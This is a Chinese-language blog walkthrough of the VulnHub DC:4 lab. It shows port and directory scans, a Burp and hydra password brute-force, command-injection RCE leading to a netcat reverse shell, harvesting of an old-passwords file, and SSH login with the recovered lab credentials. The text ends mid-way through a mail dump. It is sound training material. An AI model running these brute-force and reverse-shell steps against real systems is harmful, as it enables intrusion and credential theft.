<!DOCTYPE html><html lang="zh-CN" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="google-site-verification" content="JleqOUPaJdGpfRPLH4e3NfODV87Fmag6pJBPvxKQKEc"><title>[vulnhub]  DC:4 | Terminal-001 | T3yT3y</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"copy","copyFinish":"copied","expand":"expand"}}</script><script src="/js/gitalk.js"></script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/brands.min.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/fontawesome.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}
@font-face {
 font-family: 'Font Awesome 6 Brands';
 src: local('Font Awesome 6 Brands'), url('/lib/fontawesome/fa-brands.woff2') format('woff2');
}
@font-face {
 font-family: 'Font Awesome 6 Free';
 src: local('Font Awesome 6 Free'), url('/lib/fontawesome/fa-regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>[vulnhub]  DC:4</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-06-01T07:47:29.776Z" id="date"> 2023-06-01</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-06-02T12:31:31.888Z" id="updated"> 2023-06-02</time></div></span><br><span>Word Count: <div class="control">3.5k</div></span><br><span>Read Time: <div class="control">19 min</div></span></div></div><hr><div id="post-content"><p class='item-img' data-src='/pic/97098019_p0.jpg'><img src="/pic/97098019_p0.jpg" alt="97098019_p0"></p>
<span id="more"></span>

<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>DC-4前面信息收集和web渗透部分就是直接简单粗暴解决，提权部分主要看提权时的信息收集能力。总体来说是台很简单的靶机。</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/vulnhub/DC/4/workSpace]<br>└─$ sudo nmap -sn 192.168.56.0/24       <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-01 14:30 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.1<br>Host is up (0.00032s latency).<br>MAC Address: 0A:00:27:00:00:08 (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.100<br>Host is up (0.00030s latency).<br>MAC Address: 08:00:27:B1:3D:71 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.112<br>Host is up (0.00029s latency).<br>MAC Address: 08:00:27:DA:BB:43 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.144<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 7.29 seconds<br>                                                                                             <br>┌──(kali㉿kali)-[~/vulnhub/DC/4/workSpace]<br>└─$ sudo nmap -p- --min-rate=10000 192.168.56.112<br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-01 14:31 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.112<br>Host is up (0.0078s latency).<br>Not shown: 51829 filtered tcp ports (no-response), 13704 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>MAC Address: 08:00:27:DA:BB:43 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 36.26 seconds<br>                                                                                             <br>┌──(kali㉿kali)-[~/vulnhub/DC/4/workSpace]<br>└─$ sudo nmap -sT -sV -sC -O -p22,80 192.168.56.112<br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-01 14:32 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.112<br>Host is up (0.0014s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)<br>| ssh-hostkey: <br>|   2048 8d6057066c27e02f762ce642c001ba25 (RSA)<br>|   256 e7838cd7bb84f32ee8a25f796f8e1930 (ECDSA)<br>|_  256 fd39478a5e58339973739e227f904f4b (ED25519)<br>80/tcp open  http    nginx 1.15.10<br>|_http-title: System Tools<br>|_http-server-header: nginx/1.15.10<br>MAC Address: 08:00:27:DA:BB:43 (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 3.X|4.X<br>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br>OS details: Linux 3.2 - 4.9<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 13.80 seconds<br>                                                                                             <br>┌──(kali㉿kali)-[~/vulnhub/DC/4/workSpace]<br>└─$ sudo nmap --script=vuln 192.168.56.112         <br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-01 14:34 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.112<br>Host is up (0.014s latency).<br>Not shown: 998 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>| http-csrf: <br>| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.56.112<br>|   Found the following possible CSRF vulnerabilities: <br>|     <br>|     Path: http://192.168.56.112:80/<br>|     Form <span class="hljs-built_in">id</span>: <br>|     Form action: login.php<br>|     <br>|     Path: http://192.168.56.112:80/login.php<br>|     Form <span class="hljs-built_in">id</span>: <br>|_    Form action: login.php<br>|_http-dombased-xss: Couldn<span class="hljs-string">&#x27;t find any DOM based XSS.</span><br><span class="hljs-string">|_http-stored-xss: Couldn&#x27;</span>t find any stored XSS vulnerabilities.<br>MAC Address: 08:00:27:DA:BB:43 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 78.64 seconds<br></code></pre></td></tr></table></figure>

<p>nmap一套扫完下来并没给我们带来太多可用信息。主要告诉我们开了22和80端口，以及80端口上跑着nginx 1.15.10服务。</p>
<p>秉持着不遗漏的原则，又用nikto扫一下看看错没错过什么可用漏洞。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/vulnhub/DC/4/workSpace]<br>└─$ sudo nikto -h http://192.168.56.112<br>- Nikto v2.5.0<br>---------------------------------------------------------------------------<br>+ Target IP:          192.168.56.112<br>+ Target Hostname:    192.168.56.112<br>+ Target Port:        80<br>+ Start Time:         2023-06-01 14:34:35 (GMT8)<br>---------------------------------------------------------------------------<br>+ Server: nginx/1.15.10<br>+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options<br>+ /: The X-Content-Type-Options header is not <span class="hljs-built_in">set</span>. This could allow the user agent to render the content of the site <span class="hljs-keyword">in</span> a different fashion to the MIME <span class="hljs-built_in">type</span>. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/<br>+ No CGI Directories found (use <span class="hljs-string">&#x27;-C all&#x27;</span> to force check all possible <span class="hljs-built_in">dirs</span>)<br>+ /login.php: Cookie PHPSESSID created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies<br>+ /<span class="hljs-comment">#wp-config.php#: #wp-config.php# file found. This file contains the credentials.</span><br>+ 8102 requests: 0 error(s) and 4 item(s) reported on remote host<br>+ End Time:           2023-06-01 14:35:01 (GMT8) (26 seconds)<br>---------------------------------------------------------------------------<br>+ 1 host(s) tested<br><br></code></pre></td></tr></table></figure>

<p>遗憾的是并没有，更遗憾的是nginx 1.15也没找到什么可用的漏洞。</p>
<h2 id="web渗透"><a href="#web渗透" class="headerlink" title="web渗透"></a>web渗透</h2><h3 id="查看网站"><a href="#查看网站" class="headerlink" title="查看网站"></a>查看网站</h3><p>那就直接看看网页吧</p>
<p class='item-img' data-src='/pic/assets/dc4-login.png'><img src="/pic/assets/dc4-login.png" alt="dc4-login"></p>
<p>发现网页除了个登录框就啥也没有了。</p>
<p>目录扫描一下看看有没有别的页面。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/vulnhub/DC/4/workSpace]<br>└─$ sudo dirb http://192.168.56.112    <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br><br>-----------------<br>DIRB v2.22    <br>By The Dark Raver<br>-----------------<br><br>START_TIME: Thu Jun  1 14:31:42 2023<br>URL_BASE: http://192.168.56.112/<br>WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt<br><br>-----------------<br><br>GENERATED WORDS: 4612                                                          <br><br>---- Scanning URL: http://192.168.56.112/ ----<br>==&gt; DIRECTORY: http://192.168.56.112/css/                                                   <br>==&gt; DIRECTORY: http://192.168.56.112/images/                                                <br>+ http://192.168.56.112/index.php (CODE:200|SIZE:506)                                       <br>                                                                                            <br>---- Entering directory: http://192.168.56.112/css/ ----<br>                                                                                            <br>---- Entering directory: http://192.168.56.112/images/ ----<br>                                                                                            <br>-----------------<br>END_TIME: Thu Jun  1 14:31:56 2023<br>DOWNLOADED: 13836 - FOUND: 1<br></code></pre></td></tr></table></figure>

<p>发现并没有。</p>
<p>再用别的字典以及扩展名找一下:<code>sudo dirsearch -u 192.168.56.112 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e php,html,txt,zip</code></p>
<p>然而实际上还是发现不了解别的目录。事已至此，只能爆破了。</p>
<h3 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h3><p>用一下burpsuite。（不用hydra主要是因为这个页面输入错误凭证不会给任何错误提示而是直接跳转，不知道怎么告诉hydra那些是错误的密码）</p>
<p class='item-img' data-src='/pic/assets/dc4-bp-bf.png'><img src="/pic/assets/dc4-bp-bf.png" alt="dc4-bp-bf"></p>
<p>简简单单暴个破，字典我用的seclists里面passwords中的500-worst-passwords。</p>
<p class='item-img' data-src='/pic/assets/dc4-bf-success.png'><img src="/pic/assets/dc4-bf-success.png" alt="dc4-bf-success"></p>
<p>爆破成功，密码是happy。至于为什么下面一些密码全报200，是因为该系统页面登录成功后会给用户设置成功login的session。而之后及时输入错误的密码也将session覆盖成登录失败的session（其实是写了但是被注释掉了），具体代码可以get shell后查看login.php。</p>
<h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><p>成功登录进后台</p>
<p class='item-img' data-src='/pic/assets/dc4-backend.png'><img src="/pic/assets/dc4-backend.png" alt="dc4-backend"></p>
<p>点进command看看，发现可以选择命令执行。</p>
<p class='item-img' data-src='/pic/assets/dc-ce.png'><img src="/pic/assets/dc-ce.png" alt="dc-ce"></p>
<p>那我们来兴趣了，如果这里能执行我们的命令多好。</p>
<p>抓个包可以发现是用post传参，然后后台执行命令并传回回显。</p>
<p>那我们直接向里面写入我们的反弹shell。（URL编码部分其实就是熟悉的伪设备反弹shell，之所以用URL编码是因为防止<code>&amp;</code>被识别为间隔参数的符号了）</p>
<p class='item-img' data-src='/pic/assets/dc4-reverseshell.png'><img src="/pic/assets/dc4-reverseshell.png" alt="dc4-reverseshell"></p>
<p>发现可以成功拿到反弹shell。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/vulnhub/DC/4/workSpace]<br>└─$ sudo nc -lvp 443                      <br>listening on [any] 443 ...<br>192.168.56.112: inverse host lookup failed: Host name lookup failure<br>connect to [192.168.56.144] from (UNKNOWN) [192.168.56.112] 37492<br>bash: cannot <span class="hljs-built_in">set</span> terminal process group (331): Inappropriate ioctl <span class="hljs-keyword">for</span> device<br>bash: no job control <span class="hljs-keyword">in</span> this shell<br>www-data@dc-4:/usr/share/nginx/html$ <br></code></pre></td></tr></table></figure>



<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="www-data"><a href="#www-data" class="headerlink" title="www-data"></a>www-data</h3><p>我们拿到的shell的当前用户是www-data，基本没什么权限。<code>sudo -l</code>不知道密码，看看定时任务也没什么新鲜的，suid位倒是有个有趣的文件。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@dc-4:~$ find / -<span class="hljs-built_in">type</span> f -perm -u=s 2&gt;/dev/null<br>find / -<span class="hljs-built_in">type</span> f -perm -u=s 2&gt;/dev/null<br>/usr/bin/gpasswd<br>/usr/bin/chfn<br>/usr/bin/sudo<br>/usr/bin/chsh<br>/usr/bin/newgrp<br>/usr/bin/passwd<br>/usr/lib/eject/dmcrypt-get-device<br>/usr/lib/openssh/ssh-keysign<br>/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>/usr/sbin/exim4<br>/bin/mount<br>/bin/umount<br>/bin/su<br>/bin/ping<br>/home/jim/test.sh<br></code></pre></td></tr></table></figure>

<p>那我们就去看看，可惜只是jim的s位，没啥用。但是在jim的home目录我们发现了backup目录，进去一看就发现了jim的旧密码备份。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@dc-4:/home/jim$ <span class="hljs-built_in">cd</span> back<br><span class="hljs-built_in">cd</span> backups/<br>www-data@dc-4:/home/jim/backups$ <span class="hljs-built_in">ls</span> -la                <br><span class="hljs-built_in">ls</span> -la<br>total 12<br>drwxr-xr-x 2 jim jim 4096 Apr  7  2019 .<br>drwxr-xr-x 3 jim jim 4096 Apr  7  2019 ..<br>-rw-r--r-- 1 jim jim 2047 Apr  7  2019 old-passwords.bak<br>www-data@dc-4:/home/jim/backups$ <span class="hljs-built_in">cat</span> old-<br><span class="hljs-built_in">cat</span> old-passwords.bak <br>000000<br>12345<br>iloveyou<br>1q2w3e4r5t<br>1234<br>123456a<br>qwertyuiop<br>monkey<br>123321<br>dragon<br>......<br></code></pre></td></tr></table></figure>

<p>这里面有没有可能有jim的密码呢，但是200多条显然不可能一个个试，22端口开着，我们就用hydra爆破一下。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/vulnhub/DC/4/workSpace]<br>└─$ hydra -l jim -P old-pass ssh://192.168.56.112  <br>Hydra v9.4 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please <span class="hljs-keyword">do</span> not use <span class="hljs-keyword">in</span> military or secret service organizations, or <span class="hljs-keyword">for</span> illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).<br><br>Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-06-01 15:16:30<br>[WARNING] Many SSH configurations <span class="hljs-built_in">limit</span> the number of parallel tasks, it is recommended to reduce the tasks: use -t 4<br>[DATA] max 16 tasks per 1 server, overall 16 tasks, 253 login tries (l:1/p:253), ~16 tries per task<br>[DATA] attacking ssh://192.168.56.112:22/<br>[STATUS] 146.00 tries/min, 146 tries <span class="hljs-keyword">in</span> 00:01h, 110 to <span class="hljs-keyword">do</span> <span class="hljs-keyword">in</span> 00:01h, 13 active<br>[STATUS] 105.50 tries/min, 211 tries <span class="hljs-keyword">in</span> 00:02h, 45 to <span class="hljs-keyword">do</span> <span class="hljs-keyword">in</span> 00:01h, 13 active<br>[22][ssh] host: 192.168.56.112   login: jim   password: jibril04<br>1 of 1 target successfully completed, 1 valid password found<br>[WARNING] Writing restore file because 3 final worker threads did not complete <span class="hljs-keyword">until</span> end.<br>[ERROR] 3 targets did not resolve or could not be connected<br>[ERROR] 0 target did not complete<br>Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-06-01 15:18:50<br></code></pre></td></tr></table></figure>

<p>发现了jim的登录凭证：<code>jim:jibril04</code></p>
<h3 id="jim"><a href="#jim" class="headerlink" title="jim"></a>jim</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/vulnhub/DC/4/workSpace]<br>└─$ ssh jim@192.168.56.112          <br>The authenticity of host <span class="hljs-string">&#x27;192.168.56.112 (192.168.56.112)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">ED25519 key fingerprint is SHA256:0CH/AiSnfSSmNwRAHfnnLhx95MTRyszFXqzT03sUJkk.</span><br><span class="hljs-string">This key is not known by any other names.</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span>192.168.56.112<span class="hljs-string">&#x27; (ED25519) to the list of known hosts.</span><br><span class="hljs-string">jim@192.168.56.112&#x27;</span>s password: <br>Linux dc-4 4.9.0-3-686 <span class="hljs-comment">#1 SMP Debian 4.9.30-2+deb9u5 (2017-09-19) i686</span><br><br>The programs included with the Debian GNU/Linux system are free software;<br>the exact distribution terms <span class="hljs-keyword">for</span> each program are described <span class="hljs-keyword">in</span> the<br>individual files <span class="hljs-keyword">in</span> /usr/share/doc/*/copyright.<br><br>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br>permitted by applicable law.<br>You have mail.<br>Last login: Sun Apr  7 02:23:55 2019 from 192.168.0.100<br>jim@dc-4:~$ <br></code></pre></td></tr></table></figure>

<p>成功登录。</p>
<p>motd还提示我们有邮件，那我们先看看。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">jim@dc-4:~$ <span class="hljs-built_in">ls</span><br>backups  mbox  test.sh<br>jim@dc-4:~$ <span class="hljs-built_in">cat</span> mbox<br>From root@dc-4 Sat Apr 06 20:20:04 2019<br>Return-path: &lt;root@dc-4&gt;<br>Envelope-to: jim@dc-4<br>Delivery-<span class="hljs-built_in">date</span>: Sat, 06 Apr 2019 20:20:04 +1000<br>Received: from root by dc-4 with <span class="hljs-built_in">local</span> (Exim 4.89)<br>        (envelope-from &lt;root@dc-4&gt;)<br>        <span class="hljs-built_in">id</span> 1hCiQe-0000gc-EC<br>        <span class="hljs-keyword">for</span> jim@dc-4; Sat, 06 Apr 2019 20:20:04 +1000<br>To: jim@dc-4<br>Subject: Test<br>MIME-Version: 1.0<br>Content-Type: text/plain; charset=<span class="hljs-string">&quot;UTF-8&quot;</span><br>Content-Transfer-Encoding: 8bit<br>Message-Id: &lt;E1hCiQe-0000gc-EC@dc-4&gt;<br>From: root &lt;root@dc-4&gt;<br>Date: Sat, 06 Apr 2019 20:20:04 +1000<br>Status: RO<br><br>This is a <span class="hljs-built_in">test</span>.<br></code></pre></td></tr></table></figure>

<p>此处并没有啥信息。linux下应该还有一个邮件存储位置的来着，但是哪忘了，不过我们可以自己查一下。grep反选掉proc下的文件，主要一般proc下的信息都没啥用。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash">jim@dc-4:~$ find / -user jim 2&gt;/dev/null | grep -v proc<br>/run/user/1002<br>/run/user/1002/gnupg<br>/run/user/1002/gnupg/S.gpg-agent<br>/run/user/1002/gnupg/S.gpg-agent.extra<br>/run/user/1002/gnupg/S.gpg-agent.ssh<br>/run/user/1002/gnupg/S.gpg-agent.browser<br>/run/user/1002/systemd<br>/run/user/1002/systemd/private<br>/run/user/1002/systemd/notify<br>/run/user/1002/systemd/transient<br>/sys/fs/cgroup/systemd/user.slice/user-1002.slice/user@1002.service<br>/sys/fs/cgroup/systemd/user.slice/user-1002.slice/user@1002.service/tasks<br>/sys/fs/cgroup/systemd/user.slice/user-1002.slice/user@1002.service/init.scope<br>/sys/fs/cgroup/systemd/user.slice/user-1002.slice/user@1002.service/init.scope/cgroup.clone_children<br>/sys/fs/cgroup/systemd/user.slice/user-1002.slice/user@1002.service/init.scope/tasks<br>/sys/fs/cgroup/systemd/user.slice/user-1002.slice/user@1002.service/init.scope/notify_on_release<br>/dev/pts/0<br>/var/mail/jim<br>/home/jim<br>/home/jim/mbox<br>/home/jim/test.sh<br>/home/jim/new.sh<br>/home/jim/.profile<br>/home/jim/backups<br>/home/jim/backups/old-passwords.bak<br>/home/jim/.bashrc<br>/home/jim/.bash_logout<br>/home/jim/.bash_history<br></code></pre></td></tr></table></figure>

<p>发现是在<code>/var/mail/jim</code></p>
<p>看一看</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">jim@dc-4:~$ <span class="hljs-built_in">cat</span> /var/mail/jim<br>From charles@dc-4 Sat Apr 06 21:15:46 2019<br>Return-path: &lt;charles@dc-4&gt;<br>Envelope-to: jim@dc-4<br>Delivery-<span class="hljs-built_in">date</span>: Sat, 06 Apr 2019 21:15:46 +1000<br>Received: from charles by dc-4 with <span class="hljs-built_in">local</span> (Exim 4.89)<br>        (envelope-from &lt;charles@dc-4&gt;)<br>        <span class="hljs-built_in">id</span> 1hCjIX-0000kO-Qt<br>        <span class="hljs-keyword">for</span> jim@dc-4; Sat, 06 Apr 2019 